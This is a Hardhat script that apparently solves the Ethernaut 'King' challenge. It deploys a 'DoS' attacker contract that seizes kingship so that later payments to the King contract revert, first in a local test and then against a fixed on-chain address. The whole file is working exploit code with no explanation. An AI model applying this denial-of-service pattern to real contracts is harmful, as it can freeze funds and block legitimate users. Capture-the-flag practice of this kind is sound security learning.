import { ethers } from "hardhat";

// Run on localhost
async function handleTest() {
  const [me, deployer, other] = await ethers.getSigners();

  const kingFactory = await ethers.getContractFactory("King");
  const king = await kingFactory.connect(deployer).deploy({ value: 1 });

  const kingAddress = await king.getAddress();

  console.log(await king.prize());

  await other.sendTransaction({ to: kingAddress, value: 2 });

  console.log(await king.prize());

  const DoSFactory = await ethers.getContractFactory("DoS");
  const DoS = await DoSFactory.connect(me).deploy(kingAddress);

  await DoS.dos({ value: 3 });

  await other
    .sendTransaction({ to: kingAddress, value: 4 })
    .catch((e) => console.log(e));

  console.log(await king.prize());
}

async function handleReal() {
  const [me] = await ethers.getSigners();

  const king = await ethers.getContractAt(
    "King",
    "0x3247999824DDaeC15fE6C86d20F9D3896066cFf3"
  );

  const prevPrice = await king.prize();
  const kingAddress = await king.getAddress();

  const DoSFactory = await ethers.getContractFactory("DoS");
  const DoS = await DoSFactory.deploy(kingAddress);

  console.log(await king.prize());

  await DoS.dos({ value: prevPrice + 1n });

  console.log(await king.prize());

  await me
    .sendTransaction({ to: kingAddress, value: prevPrice + 2n })
    .catch((e) => console.log(e));

  console.log(await king.prize());
}

// handleTest().catch((error) => {
handleReal().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
